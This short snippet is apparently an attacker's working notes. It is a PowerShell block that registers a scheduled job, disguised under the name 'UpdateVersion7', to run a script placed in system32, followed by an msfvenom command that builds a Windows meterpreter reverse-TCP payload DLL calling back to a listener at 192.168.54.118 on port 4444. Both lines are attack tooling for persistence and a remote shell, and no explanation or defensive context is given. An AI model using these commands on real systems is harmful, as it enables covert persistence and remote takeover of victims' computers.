$T = @{
  Frequency="Once"
  At="7/8/2020 5:45 PM"
}
$O = @{
  WakeToRun=$true
  StartIfNotIdle=$false
  MultipleInstancePolicy="Queue"
}
Register-ScheduledJob -Trigger $T -Name UpdateVersion7 -FilePath "C:\WINDOWS\system32\uuuu.ps1"

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.54.118 lport=4444 -o ~/msf.dll